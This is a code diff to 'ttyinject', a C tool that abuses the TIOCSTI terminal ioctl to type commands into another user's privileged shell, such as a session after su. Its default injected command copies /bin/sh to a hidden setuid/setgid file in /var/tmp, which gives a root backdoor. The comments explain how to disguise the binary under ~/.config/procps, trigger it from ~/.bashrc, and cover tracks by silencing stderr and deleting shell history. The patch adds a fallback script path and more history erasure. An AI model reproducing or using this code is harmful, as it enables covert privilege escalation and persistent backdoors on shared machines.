@@ -19,7 +19,14 @@
 //
 // For the elite only:
 // -------------------
-// ttyinject <command> <screen lines to clean>
+// usage: ttyinject <command> <screen lines to clear>
+//
+// These example assume that ttyinject is installed as ~/.config/procps/reset
+//
+// By default, ttyinject tries to inject one (!) of these commands:
+// 1. Command line option <command>, if present.
+// 2. ~/.config/procps/reset.sh, if exists.
+// 3. cp /bin/sh /var/tmp/.socket; chmod 6777 /var/tmp/.socket [default]
 //
 // Example ~/.bashrc entries:
 //
@@ -31,7 +38,7 @@
 //    ~/.config/procps/reset "cp /bin/sh /tmp/.boom; chmod 4777 /bin/.boom" 8 2>/dev/null
 //
 // Will only execute ONCE (and delete itself) BUT you still need to cleanse ~/.bashrc
-// and /var/tmp/.socket
+// and /var/tmp/.socket or ~/.config/procps/reset.sh (if exists)
 
 #include <sys/ioctl.h>
 #include <sys/stat.h>
@@ -44,11 +51,12 @@
 #include <string.h>
 #include <errno.h>
 
-// 1. Bash echos any input back to user. Close STDERR to stop this.
+// 1. Bash echos all input back to the user. Close STDERR to stop this.
 // 2. Disable history so CMD does not show in user's history.
-// 3. Pipe CMD into bash's input (the 'prompt') and start CMD as background process.
-// 4. Last re-open STDERR again and let 'su' come back to foreground..
-#define START "exec 2>&-\nset +o history\n({ "
+// 3. Delete last entry in history
+// 4. Pipe CMD into bash's input (the 'prompt') and start CMD as background process.
+// 5. Last re-open STDERR again and let 'su' come back to foreground..
+#define START " exec 2>&-;set +o history\nhistory -d-1\n({ "
 #define CMD "cp /bin/sh /var/tmp/.socket; chmod 6777 /var/tmp/.socket"
 #define END ";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n"
 
@@ -57,6 +65,7 @@ main(int argc, char *argv[]) {
     pid_t ppid;
     char *ptr;
     struct stat s;
+    char buf[4096];
 
     if ((getuid() == 0) || (!isatty(STDIN_FILENO)))
         exit(0);
@@ -72,7 +81,6 @@ main(int argc, char *argv[]) {
         exit(0); // TTY has same UID as us.
 
     int clear = 4;
-    char buf[64];
     if (argc >= 3)
         clear = atoi(argv[2]);
 
@@ -89,9 +97,16 @@ main(int argc, char *argv[]) {
     for (ptr = START; *ptr != '\0'; ptr++)
         ioctl(STDIN_FILENO, TIOCSTI, ptr);
 
+    // Use ARGV[1] if given. Otherwise try ARGV[0].sh
+    // and last try default CMD.
     ptr = CMD;
     if ((argc > 1) && (*argv[1] != '\0'))
         ptr = argv[1];
+    else {
+        snprintf(buf, sizeof buf, "%s.sh", argv[0]);
+        if (stat(buf, &s) == 0)
+            ptr = buf;
+    }
     for (; *ptr != '\0'; ptr++)
         ioctl(STDIN_FILENO, TIOCSTI, ptr);
 
